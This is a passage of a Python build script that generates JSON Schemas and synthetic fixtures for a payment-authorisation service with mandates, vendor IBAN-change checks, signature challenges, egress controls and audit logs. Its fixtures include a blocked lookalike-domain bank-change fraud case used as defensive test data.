"""Generate contracts/schemas/*.json and contracts/fixtures/**.json.

Run: .venv/bin/python -m contracts.build
Source of truth is docs/CONTRACTS.md; this script is its machine-readable mirror.
Fixture display texts are produced by executor/render.py so they are always canonical.
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

from executor import render as R

ROOT = Path(__file__).resolve().parent
SCHEMAS = ROOT / "schemas"
FIXTURES = ROOT / "fixtures"
BASE = "https://airgap.local/schemas/"

# ----------------------------------------------------------------------------- primitives

TS = {"type": "string", "pattern": r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{1,6})?Z$"}
DATE = {"type": "string", "pattern": r"^\d{4}-\d{2}-\d{2}$"}
IBAN = {"type": "string", "pattern": r"^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}$"}
ICO = {"type": "string", "pattern": r"^[0-9]{8}$"}
ADDR = {"type": "string", "pattern": r"^0x[0-9a-f]{40}$"}
SIG = {"type": "string", "pattern": r"^0x[0-9a-fA-F]{130}$"}
NONCE = {"type": "string", "pattern": r"^[0-9A-F]{6}$"}
HEX64 = {"type": "string", "pattern": r"^[0-9a-f]{64}$"}
B64 = {"type": "string", "pattern": r"^[A-Za-z0-9+/=]+$"}
MINOR = {"type": "integer", "minimum": 0}
POSINT = {"type": "integer", "minimum": 1}
NNINT = {"type": "integer", "minimum": 0}
CURRENCY = {"enum": ["CZK", "EUR"]}
ROLE = {"enum": ["clerk", "treasury", "director", "accountant", "finance"]}
PURPOSE = {"enum": ["MANDATE", "CHG", "PAY", "VENDOR_ATTEST"]}
CHANGE_STATE = {"enum": ["REQUESTED", "FACTS_DONE", "ATTESTATION_CHECK", "TRIPWIRE_SENT", "CALLBACK_PENDING",
                         "CALLBACK_CONFIRMED", "CALLBACK_DENIED", "COOLING", "SIG_CLERK", "SIG_TREASURY",
                         "ACTIVE", "EXPIRED", "REJECTED"]}
ERROR_CODES = ["invalid_request", "not_found", "no_mandate", "render_mismatch", "bad_signature", "unknown_signer",
               "nonce_reused", "expired", "missing_callback_attestation", "vendor_attestation_missing",
               "attestation_quorum", "cooling_off", "sigs_insufficient", "egress_blocked",
               "callback_code_invalid", "state_conflict", "internal_error"]
EVENT_TYPES = ["enroll", "ingest", "challenge", "mandate_signed", "proposal", "facts", "decision",
               "state_transition", "signature", "attestation", "egress_block", "execution", "anchor"]
EGRESS_RULES = ["E-ALLOWLIST", "E-DLP-IBAN", "E-DLP-ICO", "E-DLP-NAME", "E-DLP-CARD", "E-DLP-COUNT",
                "E-ENCODED", "E-URLDATA"]


def nullable(s):
    return {"anyOf": [s, {"type": "null"}]}


def ref(name):
    return {"$ref": f"common.json#/$defs/{name}"}


def obj(props, required=None, extra=False):
    return {"type": "object", "properties": props,
            "required": list(props) if required is None else required,
            "additionalProperties": extra}


# ----------------------------------------------------------------------------- common defs

DEFS = {
    "timestamp": TS, "date": DATE, "iban": IBAN, "ico": ICO, "address": ADDR, "sig": SIG, "nonce": NONCE,
    "hex64": HEX64, "currency": CURRENCY, "role": ROLE, "purpose": PURPOSE, "change_state": CHANGE_STATE,
    "fact": obj({
        "id": {"type": "string", "pattern": r"^[FH]-[A-Z0-9-]+$"},
        "kind": {"enum": ["F", "H"]},
        "severity": {"enum": ["INFO", "WARN", "BLOCK"]},
        "label": {"type": "string"},
        "display_line": {"type": "string", "pattern": r"^[ -~]*$"},
        "evidence": {"type": "object"},
    }, required=["id", "kind", "severity", "label", "display_line"]),
    "hint": obj({"source": {"enum": ["agent", "ui"]}, "text": {"type": "string", "maxLength": 200}}),
    "challenge_ref": obj({
        "nonce": NONCE, "purpose": PURPOSE, "role": ROLE, "subject_id": {"type": "string"}, "exp": TS,
        "text": {"type": "string", "pattern": r"^[ -~\n]+$"}, "text_sha256": HEX64,
        "width": {"type": "integer", "minimum": 24}, "line_count": {"type": "integer", "minimum": 1, "maximum": 8},
        "used": {"type": "boolean"}, "created_at": TS,
    }, required=["nonce", "purpose", "role", "subject_id", "exp", "text", "text_sha256", "width", "line_count"]),
    "decision": obj({
        "decision": {"enum": ["allow", "deny", "challenge"]},
        "rule_ids": {"type": "array", "items": {"type": "string", "pattern": r"^[IF]-[A-Z0-9-]+$"}},
        "facts": {"type": "array", "items": ref("fact")},
        "mandate_id": nullable({"type": "string", "pattern": r"^mnd_[0-9]+$"}),
        "policy_hash": HEX64,
        "challenge": ref("challenge_ref"),
    }, required=["decision", "rule_ids", "facts", "mandate_id", "policy_hash"]),
    "error": obj({
        "error": {"anyOf": [{"enum": ERROR_CODES}, {"type": "string", "pattern": r"^rule_violation:I-[A-Z]+$"}]},
        "message": {"type": "string"},
        "details": {"type": "object"},
    }, required=["error", "message"]),
    "mandate": obj({
        "mandate_id": {"type": "string", "pattern": r"^mnd_[0-9]+$"}, "mandate_no": POSINT,
        "status": {"enum": ["PENDING_SIG", "ACTIVE", "EXPIRED", "SUPERSEDED"]},
        "max_per_payment_minor": POSINT, "max_total_minor": POSINT, "max_count": POSINT,
        "payee_scope": {"const": "existing_only"}, "valid_until": TS, "currency": {"const": "CZK"},
        "policy_hash": HEX64, "signer_address": nullable(ADDR), "spent_minor": MINOR, "count": NNINT,
        "challenge_nonce": NONCE, "created_at": TS, "activated_at": nullable(TS),
    }),
    "invoice": obj({
        "invoice_no": {"type": "string", "minLength": 1, "maxLength": 64}, "issue_date": DATE,
        "due_date": DATE, "vendor_ico": ICO, "vendor_name": {"type": "string", "maxLength": 200},
        "iban": IBAN, "amount_minor": POSINT, "currency": CURRENCY,
        "vs": {"type": "string", "pattern": r"^[0-9]{1,10}$"}, "email_id": {"type": "string"},
        "attachment_sha256": HEX64,
    }, required=["invoice_no", "issue_date", "vendor_ico", "vendor_name", "iban", "amount_minor", "currency"]),
    "authorization": obj({
        "kind": {"enum": ["mandate", "stepup"]}, "mandate_id": {"type": "string"}, "nonce": NONCE,
        "signer_address": ADDR,
    }, required=["kind"]),
    "ledger_tx": obj({
        "tx_id": {"type": "string", "pattern": r"^tx_[0-9]+$"}, "proposal_id": {"type": "string"},
        "vendor_id": {"type": "string"}, "iban": IBAN, "amount_minor": POSINT, "currency": CURRENCY,
        "vs": nullable({"type": "string"}), "authorization": ref("authorization"), "leaf_index": NNINT,
        "executed_at": TS,
    }),
    "proposal": obj({
        "proposal_id": {"type": "string", "pattern": r"^prp_[0-9]+$"}, "proposal_no": POSINT,
        "status": {"enum": ["EXECUTED", "DENIED", "PENDING_SIG", "EXPIRED", "REJECTED"]},
        "vendor_id": nullable({"type": "string"}), "invoice": ref("invoice"),
        "hints": {"type": "array", "items": ref("hint")}, "facts": {"type": "array", "items": ref("fact")},
        "decision": ref("decision"), "challenge_nonce": nullable(NONCE), "tx_id": nullable({"type": "string"}),
        "created_at": TS,
    }),
    "change": obj({
        "change_id": {"type": "string", "pattern": r"^chg_[0-9]+$"}, "change_no": POSINT, "state": CHANGE_STATE,
        "vendor_id": {"type": "string"}, "vendor_ico": ICO, "vendor_name": {"type": "string"},
        "old_iban": IBAN, "new_iban": IBAN, "email_id": nullable({"type": "string"}),
        "in_network": {"type": "boolean"}, "facts": {"type": "array", "items": ref("fact")},
        "not_before": nullable(TS), "expires_at": TS,
        "callback": obj({"status": {"enum": ["none", "pending", "confirmed", "denied"]},
                         "code_exp": nullable(TS)}),
        "signatures": {"type": "array", "items": obj({"role": ROLE, "address": ADDR, "nonce": NONCE,
                                                      "signed_at": TS})},
        "pending_challenge": nullable(ref("challenge_ref")),
        "history": {"type": "array", "items": obj({"from": nullable(CHANGE_STATE), "to": CHANGE_STATE,
                                                   "at": TS, "reason": {"type": "string"}})},
        "created_at": TS,
    }),
    "vendor": obj({
        "vendor_id": {"type": "string", "pattern": r"^ven_[0-9]{8}$"}, "ico": ICO, "name": {"type": "string"},
        "domain": {"type": "string"}, "iban": IBAN, "bic": {"type": "string"},
        "country": {"type": "string", "pattern": r"^[A-Z]{2}$"}, "phone": {"type": "string"},
        "contact_email": {"type": "string"}, "registered_since": DATE, "in_network": {"type": "boolean"},
        "iban_history": {"type": "array", "items": obj({"iban": IBAN, "from": DATE, "to": nullable(DATE),
                                                        "change_id": nullable({"type": "string"})})},
    }, required=["vendor_id", "ico", "name", "domain", "iban", "country", "phone", "contact_email",
                 "registered_since", "in_network", "iban_history"]),
    "policy_signer": obj({"address": ADDR, "role": ROLE, "role_basis": {"type": "string"}}),
    "vendor_policy": obj({
        "ico": ICO, "policy_v": POSINT, "signers": {"type": "array", "items": ref("policy_signer"), "minItems": 1},
        "threshold": POSINT, "status": {"enum": ["ACTIVE", "SUPERSEDED"]}, "or_extract_sha256": HEX64,
        "created_at": TS,
    }),
    "attestation": obj({
        "type": {"const": "vendor_account_attestation"}, "v": POSINT, "ico": ICO, "name": {"type": "string"},
        "iban": IBAN, "valid_from": DATE, "supersedes": nullable(POSINT),
        "policy": obj({"signers": {"type": "array", "items": ref("policy_signer")}, "threshold": POSINT,
                       "policy_v": POSINT}),
        "proofs": obj({"or_extract_sha256": HEX64, "penny_nonce": {"type": "string"}}),
        "sigs": {"type": "array", "items": obj({"role": ROLE, "address": ADDR, "sig": SIG, "nonce": NONCE})},
        "status": {"enum": ["PENDING_SIGS", "PUBLISHED", "REVOKED", "SUPERSEDED"]},
        "commitment": nullable(HEX64), "leaf_index": nullable(NNINT), "revoked": {"type": "boolean"},
        "created_at": TS,
    }),
    "sth_body": obj({"log_id": {"enum": ["audit", "attest"]}, "tree_size": NNINT, "root_hash": HEX64,
                     "timestamp": NNINT}),
    "sth_signed": obj({"body": ref("sth_body"), "executor_sig": B64, "witness_sig": nullable(B64)}),
    "inclusion_proof": obj({"log_id": {"enum": ["audit", "attest"]}, "leaf_index": NNINT, "tree_size": POSINT,
                            "leaf_hash": HEX64, "audit_path": {"type": "array", "items": HEX64},
                            "sth": ref("sth_signed")}),
}

AUDIT_DATA_REQUIRED = {
    "enroll": ["address", "role", "device", "label"],
    "ingest": ["email_id", "sha256", "from_domain", "received_at"],
    "challenge": ["nonce", "purpose", "role", "subject_id", "text_sha256", "exp"],
    "mandate_signed": ["mandate_id", "mandate_no", "policy_hash", "signer_address", "nonce", "fields"],
    "proposal": ["proposal_id", "invoice", "hints"],
    "facts": ["subject_id", "facts"],
    "decision": ["subject_id", "decision", "rule_ids", "mandate_id", "policy_hash"],
    "state_transition": ["change_id", "from", "to", "reason"],
    "signature": ["nonce", "purpose", "role", "signer_address", "text_sha256", "sig", "accepted", "error"],
    "attestation": ["ico", "v", "action", "status", "commitment", "attest_leaf_index"],
    "egress_block": ["tool", "target", "rule_ids", "findings", "content_sha256"],
    "execution": ["tx_id", "proposal_id", "vendor_id", "iban", "amount_minor", "currency", "authorization"],
    "anchor": ["log_id", "tree_size", "root_hash", "s3_key", "tsa_token_sha256"],
}

DEFS["audit_event"] = {
    "type": "object",
    "properties": {
        "v": {"const": 1}, "log_id": {"enum": ["audit", "attest"]}, "seq": NNINT, "ts": TS,
        "type": {"enum": EVENT_TYPES},
        "actor": {"enum": ["executor", "agent", "host", "vendor_portal", "ingest", "witness", "tool"]},
        "subject_id": nullable({"type": "string"}), "data": {"type": "object"},
    },
    "required": ["v", "log_id", "seq", "ts", "type", "actor", "subject_id", "data"],
    "additionalProperties": False,
    "allOf": [
        {"if": {"properties": {"type": {"const": t}}},
         "then": {"properties": {"data": {"required": req}}}}
        for t, req in AUDIT_DATA_REQUIRED.items()
    ],
}

# ----------------------------------------------------------------------------- endpoint schemas

SCHEMA_FILES = {
    "common": {"$defs": DEFS},
    "error": ref("error"),
    "audit_event": ref("audit_event"),
    "challenge": ref("challenge_ref"),
    "mandate": ref("mandate"),
    "proposal": ref("proposal"),
    "change": ref("change"),
    "vendor": ref("vendor"),
    "ledger_tx": ref("ledger_tx"),
    "mandate_create.request": obj({
        "max_per_payment_minor": POSINT, "max_total_minor": POSINT,
        "max_count": {"type": "integer", "minimum": 1, "maximum": 1000},
        "payee_scope": {"const": "existing_only"}, "valid_until": TS, "currency": {"const": "CZK"}}),
    "mandate_create.response": obj({"mandate": ref("mandate"), "challenge": ref("challenge_ref")}),
    "proposal_create.request": obj({"invoice": ref("invoice"), "hints": {"type": "array", "items": ref("hint")}},
                                   required=["invoice"]),
    "proposal_create.response": obj({"proposal": ref("proposal"), "decision": ref("decision"),
                                     "tx": nullable(ref("ledger_tx"))}),
    "proposal_list.response": obj({"proposals": {"type": "array", "items": ref("proposal")}}),
    "change_create.request": obj({"vendor_ico": ICO, "new_iban": IBAN, "email_id": {"type": "string"},
                                  "hints": {"type": "array", "items": ref("hint")}},
                                 required=["vendor_ico", "new_iban"]),
    "change_create.response": obj({"change": ref("change"), "decision": ref("decision")}),
    "change_list.response": obj({"changes": {"type": "array", "items": ref("change")}}),
    "change_reject.request": obj({"reason": {"type": "string", "maxLength": 200}}),
    "signature_submit.request": obj({"nonce": NONCE, "role": ROLE, "sig": {"type": "string"},
                                     "address": {"type": "string"},
                                     "displayed_text": {"type": "string"}},
                                    required=["nonce", "role", "sig"]),
    "signature_submit.response": obj({
        "nonce": NONCE, "purpose": PURPOSE, "subject_id": {"type": "string"}, "signer_address": ADDR,
        "effect": obj({"type": {"enum": ["mandate_activated", "payment_executed", "change_advanced",
                                         "attestation_signed", "attestation_published"]},
                       "state": {"type": "string"}, "tx_id": {"type": "string"}}, required=["type"]),
        "mandate": ref("mandate"), "proposal": ref("proposal"), "tx": ref("ledger_tx"),
        "change": ref("change"), "attestation": ref("attestation"),
    }, required=["nonce", "purpose", "subject_id", "signer_address", "effect"]),
    "callback_submit.request": obj({"code": {"type": "string", "pattern": r"^[0-9]{6}$"},
                                    "outcome": {"enum": ["confirm", "deny"]}}),
    "notifications.response": obj({"notifications": {"type": "array", "items": obj({
        "notif_id": {"type": "string"}, "ico": ICO, "kind": {"enum": ["tripwire", "callback"]},
        "change_id": {"type": "string"}, "code": {"type": "string", "pattern": r"^[0-9]{6}$"},
        "created_at": TS}, required=["notif_id", "ico", "kind", "change_id", "created_at"])}}),
    "attestation_create.request": {
        "oneOf": [
            obj({"action": {"const": "propose"}, "ico": ICO, "iban": IBAN, "valid_from": DATE,
                 "supersedes": nullable(POSINT), "penny_nonce": {"type": "string"}},
                required=["action", "ico", "iban", "valid_from", "supersedes"]),
            obj({"action": {"const": "revoke"}, "ico": ICO, "revokes_v": POSINT}),
        ]
    },
    "attestation_create.response": obj({"attestation": ref("attestation"),
                                        "challenges": {"type": "array", "items": ref("challenge_ref")}}),
    "attestation_get.response": obj({"attestation": nullable(ref("attestation")), "policy": ref("vendor_policy"),
                                     "inclusion_proof": nullable(ref("inclusion_proof"))}),
    "egress.request": obj({
        "tool": {"enum": ["send_email", "http_get", "http_post", "upload"]}, "target": {"type": "string"},
        "content": {"type": "string"},
        "attachments": {"type": "array", "items": obj({"name": {"type": "string"}, "content_b64": B64})},
        "context_ref": {"type": "string"}}, required=["tool", "target", "content"]),
    "egress.response": obj({"decision": {"const": "allow"}, "rule_ids": {"type": "array", "maxItems": 0},
                            "findings": {"type": "array", "maxItems": 0}}),
    "egress_block.decision": obj({"decision": {"const": "block"},
                                  "rule_ids": {"type": "array", "minItems": 1, "items": {"enum": EGRESS_RULES}},
                                  "findings": {"type": "array", "items": obj({
                                      "rule_id": {"enum": EGRESS_RULES}, "detail": {"type": "string"},
                                      "count": NNINT})}}),
    "audit_export.response": obj({
        "log_id": {"enum": ["audit", "attest"]},
        "leaves": {"type": "array", "items": obj({"seq": NNINT, "event": ref("audit_event"),
                                                  "leaf_hash": HEX64})},
        "sths": {"type": "array", "items": ref("sth_signed")},
        "anchors": {"type": "array", "items": obj({"s3_key": {"type": "string"}, "sth": ref("sth_signed"),
                                                   "tsa_token_b64": nullable(B64)})},
        "public_keys": obj({"executor": {"type": "string"}, "witness": {"type": "string"}}),
        "policy": {"type": "object"}}),
    "receipt": obj({"tx": ref("ledger_tx"), "inclusion_proof": ref("inclusion_proof"), "receipt_sig": B64,
                    "key_id": {"type": "string"}}),
    "vendor_list.response": obj({"vendors": {"type": "array", "items": ref("vendor")}}),
    "ledger_list.response": obj({"txs": {"type": "array", "items": ref("ledger_tx")}}),
    "ingest.request": obj({"raw_b64": B64, "received_at": TS}, required=["raw_b64"]),
    "ingest.response": obj({"email_id": {"type": "string", "pattern": r"^eml_[0-9a-f]{16}$"},
                            "from_domain": {"type": "string"}, "received_at": TS}),
    "inbox_list.response": obj({"emails": {"type": "array", "items": obj({
        "email_id": {"type": "string"}, "from_addr": {"type": "string"}, "from_domain": {"type": "string"},
        "subject": {"type": "string"}, "received_at": TS})}}),
    "health.response": obj({"status": {"const": "ok"}, "backend": {"enum": ["memory", "moto", "aws"]},
                            "policy_hash": HEX64, "render_width": {"type": "integer"}}),
}

# endpoint -> (request schema | None, success response schema)
ENDPOINTS = {
    "POST /mandates": ("mandate_create.request", "mandate_create.response"),
    "GET /mandates/active": (None, "mandate"),
    "GET /mandates/{mandate_id}": (None, "mandate"),
    "POST /proposals": ("proposal_create.request", "proposal_create.response"),
    "GET /proposals": (None, "proposal_list.response"),
    "GET /proposals/{proposal_id}": (None, "proposal"),
    "POST /changes": ("change_create.request", "change_create.response"),
    "GET /changes": (None, "change_list.response"),
    "GET /changes/{change_id}": (None, "change"),
    "POST /changes/{change_id}/reject": ("change_reject.request", "change"),
    "GET /challenges/{nonce}": (None, "challenge"),
    "POST /signatures": ("signature_submit.request", "signature_submit.response"),
    "POST /callbacks/{change_id}": ("callback_submit.request", "change"),
    "GET /portal/notifications": (None, "notifications.response"),
    "POST /attestations": ("attestation_create.request", "attestation_create.response"),
    "GET /attestations/{ico}": (None, "attestation_get.response"),
    "POST /egress": ("egress.request", "egress.response"),
    "GET /audit/export": (None, "audit_export.response"),
    "GET /receipts/{tx_id}": (None, "receipt"),
    "GET /vendors": (None, "vendor_list.response"),
    "GET /vendors/{vendor_id}": (None, "vendor"),
    "GET /ledger": (None, "ledger_list.response"),
    "POST /ingest": ("ingest.request", "ingest.response"),
    "GET /inbox": (None, "inbox_list.response"),
    "GET /health": (None, "health.response"),
}


def write_schemas():
    SCHEMAS.mkdir(parents=True, exist_ok=True)
    for name, body in SCHEMA_FILES.items():
        doc = {"$schema": "https://json-schema.org/draft/2020-12/schema", "$id": f"{BASE}{name}.json",
               "title": name, **body}
        (SCHEMAS / f"{name}.json").write_text(json.dumps(doc, indent=2, ensure_ascii=False) + "\n")
    (SCHEMAS / "endpoints.json").write_text(json.dumps(
        {k: {"request": a, "response": b, "error": "error"} for k, (a, b) in ENDPOINTS.items()},
        indent=2) + "\n")


# ----------------------------------------------------------------------------- fixtures (synthetic)


def _addr(seed: str) -> str:
    return "0x" + hashlib.sha256(seed.encode()).hexdigest()[:40]


def _sig(seed: str) -> str:
    h = hashlib.sha256(seed.encode()).hexdigest()
    return "0x" + (h * 3)[:128] + "1b"


def _h(seed: str) -> str:
    return hashlib.sha256(seed.encode()).hexdigest()


CLERK, TREASURY = _addr("clerk"), _addr("treasury")
JED, UCT, FIN = _addr("acme-director"), _addr("acme-accountant"), _addr("acme-finance")
POLICY_HASH = "1f3a9c0e" + _h("policy")[8:]
ACME_IBAN, FRAUD_IBAN, BETA_IBAN = "CZ6508000000192000145399", "LT483999000000001234", "CZ6203000000000123456789"
NEW_LEGIT_IBAN = "CZ8601000000000099887766"
NOW = "2026-10-19T12:00:00Z"
WIDTH = R.DEFAULT_WIDTH


def fact(id, sev, line, label, kind="F", **ev):
    f = {"id": id, "kind": kind, "severity": sev, "label": label, "display_line": line}
    if ev:
        f["evidence"] = ev
    return f


def challenge_ref(purpose, role, subject_id, nonce, exp, template, params):
    text = R.render(template, params, width=WIDTH)
    return {"nonce": nonce, "purpose": purpose, "role": role, "subject_id": subject_id, "exp": exp,
            "text": text, "text_sha256": R.text_sha256(text), "width": WIDTH,
            "line_count": len(text.split("\n"))}


MANDATE_PARAMS = dict(mandate_no=3, nonce="91BC02", max_per_payment_minor=8000000, max_total_minor=25000000,
                      max_count=20, payee_scope="existing_only", valid_until="2026-10-20T16:00:00Z",
                      currency="CZK", policy_hash=POLICY_HASH)
MANDATE_CH = challenge_ref("MANDATE", "clerk", "mnd_3", "91BC02", "2026-10-19T12:05:00Z", "MANDATE",
                           MANDATE_PARAMS)


def mandate(status="PENDING_SIG", **kw):
    m = {"mandate_id": "mnd_3", "mandate_no": 3, "status": status, "max_per_payment_minor": 8000000,
         "max_total_minor": 25000000, "max_count": 20, "payee_scope": "existing_only",
         "valid_until": "2026-10-20T16:00:00Z", "currency": "CZK", "policy_hash": POLICY_HASH,
         "signer_address": None, "spent_minor": 0, "count": 0, "challenge_nonce": "91BC02",
         "created_at": NOW, "activated_at": None}
    m.update(kw)
    return m


ACTIVE_MANDATE = mandate("ACTIVE", signer_address=CLERK, activated_at="2026-10-19T12:01:10Z",
                         spent_minor=4200000, count=3)

VENDOR_ACME = {"vendor_id": "ven_12345678", "ico": "12345678", "name": "ACME s.r.o.", "domain": "acme.cz",
               "iban": ACME_IBAN, "bic": "GIBACZPX", "country": "CZ", "phone": "+420 200 000 001",
               "contact_email": "accounting@acme.cz", "registered_since": "2023-02-01", "in_network": True,
               "iban_history": [{"iban": ACME_IBAN, "from": "2023-02-01", "to": None, "change_id": None}]}
VENDOR_BETA = {"vendor_id": "ven_87654321", "ico": "87654321", "name": "Beta Servis a.s.", "domain": "betaservis.cz",
               "iban": BETA_IBAN, "country": "CZ", "phone": "+420 200 000 002",
               "contact_email": "fakturace@betaservis.cz", "registered_since": "2022-06-15", "in_network": False,
               "iban_history": [{"iban": BETA_IBAN, "from": "2022-06-15", "to": None, "change_id": None}]}

INVOICE_OK = {"invoice_no": "FV-2026-0412", "issue_date": "2026-10-15", "due_date": "2026-10-29",
              "vendor_ico": "12345678", "vendor_name": "ACME s.r.o.", "iban": ACME_IBAN, "amount_minor": 1450000,
              "currency": "CZK", "vs": "20260412", "email_id": "eml_a1b2c3d4e5f60718"}
INVOICE_BIG = {"invoice_no": "2026104", "issue_date": "2026-10-16", "vendor_ico": "87654321",
               "vendor_name": "Beta Servis a.s.", "iban": BETA_IBAN, "amount_minor": 12500000, "currency": "CZK",
               "vs": "2026104"}
INVOICE_DUP = dict(INVOICE_OK, invoice_no="FV2026412", email_id="eml_0f1e2d3c4b5a6978")

F_VAT_OK = fact("F-VAT", "INFO", "VAT acct: YES", "Account published in VAT registry", account_published=True)
F_OVER = fact("F-MANDATE", "WARN", "above mandate (max 80000)", "Above mandate limit",
              amount_minor=12500000, max_per_payment_minor=8000000)

PAY_PARAMS = dict(proposal_no=41, nonce="0C55A1", exp="2026-10-19T13:20:00Z", payee_name="Beta Servis a.s.",
                  iban=BETA_IBAN, amount_minor=12500000, currency="CZK", vs="2026104", facts=[F_OVER, F_VAT_OK])
PAY_CH = challenge_ref("PAY", "clerk", "prp_41", "0C55A1", "2026-10-19T13:20:00Z", "PAY", PAY_PARAMS)

BEC_FACTS = [
    fact("F-DOMAIN", "BLOCK", "acme-cz.com != acme.cz", "Sender domain vs registry",
         from_domain="acme-cz.com", registry_domain="acme.cz", distance=1),
    fact("F-ATTEST", "BLOCK", "supplier 0/3", "Vendor attestation for new IBAN", signed=0, threshold=2, signers=3),
    fact("F-BANK", "WARN", "bank: EMI Lithuania (fict.)", "Bank from IBAN", country="LT", bank_code="39990"),
    fact("F-VAT", "WARN", "VAT acct: NO", "Account published in VAT registry", account_published=False),
    fact("F-DKIM", "INFO", "DKIM ok d=acme-cz.com", "DKIM signature", d="acme-cz.com", valid=True),
    fact("F-FIRSTSEEN", "WARN", "domain first seen 2h", "Domain first seen in inbox", hours=2),
    fact("H-AGENT", "INFO", 'agent: "bank change, urgent"', "Agent stated reason", kind="H"),
]
CHG_PARAMS = dict(change_no=7, nonce="4F2A9C", exp="2026-10-19T12:05:00Z", vendor_name="ACME s.r.o.",
                  vendor_ico="12345678", old_iban=ACME_IBAN, new_iban=FRAUD_IBAN, facts=BEC_FACTS)
CHG_CH = challenge_ref("CHG", "clerk", "chg_7", "4F2A9C", "2026-10-19T12:05:00Z", "CHG", CHG_PARAMS)

LEGIT_FACTS = [
    fact("F-ATTEST", "INFO", "supplier 2/3: YES", "Vendor attestation for new IBAN", signed=2, threshold=2,
         signers=3),
    fact("F-DOMAIN", "INFO", "domain acme.cz = registry", "Sender domain vs registry", from_domain="acme.cz",
         registry_domain="acme.cz", distance=0),
    fact("F-DKIM", "INFO", "DKIM ok d=acme.cz", "DKIM signature", d="acme.cz", valid=True),
    fact("F-BANK", "INFO", "bank: Komercni banka", "Bank from IBAN", country="CZ", bank_code="0100"),
    fact("F-VAT", "WARN", "VAT acct: NO", "Account published in VAT registry", account_published=False),
]
CHG8_PARAMS = dict(change_no=8, nonce="A0B1C2", exp="2026-10-19T12:10:00Z", vendor_name="ACME s.r.o.",
                   vendor_ico="12345678", old_iban=ACME_IBAN, new_iban=NEW_LEGIT_IBAN, facts=LEGIT_FACTS)
CHG8_CH = challenge_ref("CHG", "clerk", "chg_8", "A0B1C2", "2026-10-19T12:10:00Z", "CHG", CHG8_PARAMS)

ATT_POLICY = {"signers": [{"address": JED, "role": "director", "role_basis": "OR"},
                          {"address": UCT, "role": "accountant", "role_basis": "POA"},
                          {"address": FIN, "role": "finance", "role_basis": "POA"}],
              "threshold": 2, "policy_v": 1}


def att_challenge(role, basis, nonce):
    params = dict(vendor_name="ACME s.r.o.", ico="12345678", version=5, nonce=nonce, iban=NEW_LEGIT_IBAN,
                  valid_from="2026-10-20", signer_role=role, role_basis=basis, threshold=2, signer_count=3)
    return challenge_ref("VENDOR_ATTEST", role, "12345678#5", nonce, "2026-10-19T12:30:00Z", "VENDOR_ATTEST",
                         params)


def attestation(status: str, sigs: list[dict], leaf_index: int | None = None,
                commitment: str | None = None) -> dict:
    return {"type": "vendor_account_attestation", "v": 5, "ico": "12345678", "name": "ACME s.r.o.",
            "iban": NEW_LEGIT_IBAN, "valid_from": "2026-10-20", "supersedes": 4, "policy": ATT_POLICY,
            "proofs": {"or_extract_sha256": _h("or-acme"), "penny_nonce": "PX-91-4421"}, "sigs": sigs,
            "status": status, "commitment": commitment, "leaf_index": leaf_index, "revoked": False,
            "created_at": NOW}


STH = {"body": {"log_id": "audit", "tree_size": 40, "root_hash": _h("root40"), "timestamp": 1792411200000},
       "executor_sig": "MEUCIQDexampleexecutorsig0000000000000000000000000AiAexample000000000000000000000000==",
       "witness_sig": "MEUCIQDexamplewitnesssig00000000000000000000000000AiAexample000000000000000000000000=="}
ATT_STH = {"body": {"log_id": "attest", "tree_size": 6, "root_hash": _h("aroot6"), "timestamp": 1792411300000},
           "executor_sig": STH["executor_sig"], "witness_sig": STH["witness_sig"]}

TX = {"tx_id": "tx_38", "proposal_id": "prp_38", "vendor_id": "ven_12345678", "iban": ACME_IBAN,
      "amount_minor": 1450000, "currency": "CZK", "vs": "20260412",
      "authorization": {"kind": "mandate", "mandate_id": "mnd_3"}, "leaf_index": 37,
      "executed_at": "2026-10-19T12:02:03Z"}


def proposal(no: int, status: str, invoice: dict, facts: list[dict], decision: dict,
             challenge_nonce: str | None = None, tx_id: str | None = None, hints: tuple | list = ()) -> dict:
    return {"proposal_id": f"prp_{no}", "proposal_no": no, "status": status,
            "vendor_id": "ven_" + invoice["vendor_ico"], "invoice": invoice, "hints": list(hints),
            "facts": facts, "decision": decision, "challenge_nonce": challenge_nonce, "tx_id": tx_id,
            "created_at": "2026-10-19T12:02:00Z"}


def decision(d: str, rule_ids: list[str], facts: list[dict], challenge: dict | None = None,
             mandate_id: str | None = "mnd_3") -> dict:
    out = {"decision": d, "rule_ids": rule_ids, "facts": facts, "mandate_id": mandate_id,
           "policy_hash": POLICY_HASH}
    if challenge:
        out["challenge"] = challenge
    return out


F_ACME_OK = [F_VAT_OK, fact("F-BANK", "INFO", "bank: Ceska sporitelna", "Bank from IBAN", country="CZ",
                            bank_code="0800")]
DEC_ALLOW = decision("allow", [], F_ACME_OK)
DEC_CH = decision("challenge", ["F-MANDATE", "I-PER"], [F_OVER, F_VAT_OK], PAY_CH)
F_DUP = fact("F-DUP", "BLOCK", "duplicate FV-2026-0412", "Duplicate invoice", matched="prp_38")
DEC_DENY = decision("deny", ["F-DUP", "I-DUP"], F_ACME_OK + [F_DUP])


def change(no, state, new_iban, facts, pending, **kw):
    c = {"change_id": f"chg_{no}", "change_no": no, "state": state, "vendor_id": "ven_12345678",
         "vendor_ico": "12345678", "vendor_name": "ACME s.r.o.", "old_iban": ACME_IBAN, "new_iban": new_iban,
         "email_id": "eml_9a8b7c6d5e4f3021", "in_network": True, "facts": facts, "not_before": None,
         "expires_at": "2026-10-19T13:00:00Z", "callback": {"status": "none", "code_exp": None},
         "signatures": [], "pending_challenge": pending,
         "history": [{"from": None, "to": "REQUESTED", "at": NOW, "reason": "created"},
                     {"from": "REQUESTED", "to": "FACTS_DONE", "at": NOW, "reason": "facts computed"},
                     {"from": "FACTS_DONE", "to": "ATTESTATION_CHECK", "at": NOW, "reason": "auto"}],
         "created_at": NOW}
    c.update(kw)
    return c


CHG7 = change(7, "ATTESTATION_CHECK", FRAUD_IBAN, BEC_FACTS, CHG_CH)
CHG8_SIG_CLERK = change(8, "SIG_CLERK", NEW_LEGIT_IBAN, LEGIT_FACTS, CHG8_CH,
                        not_before="2026-10-19T12:01:30Z",
                        history=CHG7["history"] + [
                            {"from": "ATTESTATION_CHECK", "to": "COOLING", "at": NOW, "reason": "attestation 2/3"},
                            {"from": "COOLING", "to": "SIG_CLERK", "at": "2026-10-19T12:01:30Z",
                             "reason": "cooling elapsed"}])
CHG9_OFF = dict(change(9, "CALLBACK_CONFIRMED", NEW_LEGIT_IBAN, LEGIT_FACTS[1:], None,
